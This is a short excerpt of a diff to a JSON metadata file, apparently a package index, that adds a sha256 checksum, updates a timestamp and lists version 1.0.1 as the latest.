-          "updated_at": "2026-02-19T21:06:46.525453Z"
+          "sha256": "add90b0a6507898aeb878500488d9ce96d8b9220f3dad36ea7743d8e9580e353",
+          "updated_at": "2026-02-22T14:43:16.149966Z"
         }
       },
       "latest": "1.0.1",
